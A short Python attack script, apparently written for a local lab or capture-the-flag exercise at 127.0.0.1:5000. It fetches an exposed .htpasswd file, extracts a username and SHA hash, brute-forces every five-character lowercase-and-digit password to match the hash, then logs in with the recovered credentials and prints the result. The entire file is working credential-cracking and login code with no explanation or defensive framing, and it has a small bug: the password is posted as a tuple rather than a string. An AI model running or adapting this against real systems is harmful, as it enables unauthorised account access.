import itertools

import requests
import re

import htpasswdlib
URL_HASH = "http://127.0.0.1:5000/.htpasswd"
URL = "http://127.0.0.1:5000"

chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
combs = itertools.product(chars, repeat=5)

with requests.session() as session:
    hash_werte = session.get(URL_HASH)
    print(hash_werte.text)
    matches = re.findall(r"(\w+):\{SHA\}(.+)\n", hash_werte.text)
    username = ""
    hash_wert = ""
    password = ""

    print(matches)
    for match in matches:
        username, hash_wert = match
        break
    for c in combs:
        print("".join(c))
        cc = htpasswdlib.sha1_hash(username, "".join(c))
        match = re.search(r"\{SHA\}(.+)", cc)
        if match.group(1) == hash_wert:
            password = c
            break


    print(password)
    data = {'username': username,
            'password': password}
    session.post(URL, data=data)
    r = session.get(URL)
    print(r.text)
